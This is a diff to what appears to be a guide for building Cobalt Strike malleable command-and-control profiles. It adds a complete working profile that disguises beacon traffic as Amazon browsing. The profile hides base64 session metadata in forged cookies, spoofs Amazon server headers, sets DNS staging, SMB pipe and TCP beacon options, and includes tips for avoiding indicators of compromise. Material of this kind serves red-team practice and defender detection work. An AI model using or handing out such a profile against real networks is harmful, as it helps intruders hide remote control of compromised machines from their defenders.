@@ -470,7 +470,7 @@ Add this to your profile
 ```
 https-certificate {
 	set keystore "tester.store";
-	set password "mypassword";
+	set password "password";
 }
 
 ```
@@ -484,6 +484,8 @@ keytool -genkey -alias server -keyalg RSA -keysize 2048 -keystore.jks
 
 keytool -certreq -alias server -file csr.csr -keystore keystore.jks
 
+
+#can skip this step
 #need to request a .p7b from a place like digitcert
 
 keytool -import -trustcacerts -alias server -file strategic_cyber_llc.p7b -keystrore keystore.jks
@@ -500,6 +502,170 @@ code-signer {
 
 ```
 
+
+Final profile:
+
+```
+#
+
+# Amazon browsing traffic profile
+
+#
+
+# Author: @harmj0y
+
+#
+
+set sleeptime "4000";
+
+set jitter "10";
+
+set maxdns "255";
+
+set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0";
+
+set dns_idel "8.8.8.8"; # IP to indicate no tasks available. Avoid using bogon address "0.0.0.0" (This can be picked up as IOC)
+  
+set maxdns "[0-255]"; # Maximum length of hostname when uploading data over DNS (0-255)
+  
+set dns_sleep "1005"; # Force a sleep prior to each individual DNS request. (in milliseconds)
+  
+set dns_stager_prepend ""; # Prepend text to payload stage delivered to DNS TXT record stager
+  
+set dns_stager_subhost ".stage.8546."; # Subdomain used by DNS TXT record stager
+  
+set dns_max_txt "[0-255]"; # Maximum length of DNS TXT responses for tasks
+  
+set dns_ttl "1"; # TTL for DNS replies
+
+set pipename "win_svc+8546"; # Name of pipe to use for SMB beacon's peer-to-peer communication
+  
+set pipename_stager "win_svc+8546"; # Name of pipe to use for SMB beacon's named pipe stager
+
+set tcp_port "1337"; # TCP beacon listen port
+
+
+https-certificate {
+	set keystore "tester.store";
+	set password "password";
+}
+
+code-signer {
+	set keystore "keystore.jks";
+	set password "password";
+	set alias    "server";
+}
+
+
+http-get {
+
+set uri "/d/ref=nb_sb_noss_2/167-3294888-0262948/field-keywords=pens";
+
+client {
+
+header "Accept" "*/*";
+
+header "Host" "www.amazon.com";
+
+metadata {
+
+base64;
+
+prepend "session-token=";
+
+prepend "skin=noskin;";
+
+append "csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";
+
+header "Cookie";
+
+}
+
+}
+
+server {
+
+header "Server" "Server";
+
+header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
+
+header "x-amz-id-2" "a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
+
+header "X-Frame-Options" "SAMEORIGIN";
+
+header "Content-Encoding" "gzip";
+
+output {
+
+print;
+
+}
+
+}
+
+}
+
+http-post {
+
+set uri "/N4215/adj/amzn.us.sr.aps";
+
+client {
+
+header "Accept" "*/*";
+
+header "Content-Type" "text/xml";
+
+header "X-Requested-With" "XMLHttpRequest";
+
+header "Host" "www.amazon.com";
+
+parameter "sz" "160x600";
+
+parameter "oe" "oe=ISO-8859-1;";
+
+id {
+
+parameter "sn";
+
+}
+
+parameter "s" "3717";
+
+parameter "dc_ref" "http%3A%2F%2Fwww.amazon.com";
+
+output {
+
+base64;
+
+print;
+
+}
+
+}
+
+server {
+
+header "Server" "Server";
+
+header "x-amz-id-1" "THK9YEZJCKPGY5T42OZT";
+
+header "x-amz-id-2" "a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
+
+header "X-Frame-Options" "SAMEORIGIN";
+
+header "x-ua-compatible" "IE=edge";
+
+output {
+
+print;
+
+}
+
+}
+
+}
+
+```
 
 Check for errors with `\opt\cobaltstrike\c2lint [/path/to/my.profile]`
 
